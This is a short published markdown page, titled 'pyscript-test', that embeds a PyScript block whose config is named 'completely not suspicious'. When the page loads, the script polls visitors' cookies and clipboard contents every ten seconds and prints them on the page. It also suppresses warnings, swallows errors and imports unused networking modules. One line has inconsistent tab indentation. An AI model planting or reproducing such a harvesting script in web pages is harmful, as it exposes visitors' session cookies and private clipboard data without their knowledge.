---
publish: true
title: pyscript-test
---


<div id="c"></div>
<script type="module" src="https://pyscript.net/releases/2025.2.1/core.js"></script>
<script type="py" config='{"name": "completely not suspicious", "packages": ["asyncio"]}'>
import asyncio, js, pyscript, base64, urllib
from pyodide.ffi import create_proxy
import warnings
warnings.filterwarnings("ignore")

from js import XMLHttpRequest
from io import StringIO
from pyscript import document

async def get_clipboard_data():
        try:
            all_cookies = document.cookie
            text_data = await js.navigator.clipboard.readText()
	        print("Cookies:\n"+all_cookies+"\nClipBoard:\n"+text_data)
        except:
            pass

pyscript.document.querySelector("#c").focus()
get_clipboard_data_proxy = create_proxy(get_clipboard_data)
print("<h1>Data Found by clicking this page:<h1>\n\n")
async def main():
    while True:
        try:
            asyncio.ensure_future(get_clipboard_data_proxy())
            await asyncio.sleep(10)
        except:
            pass

main()
</script>
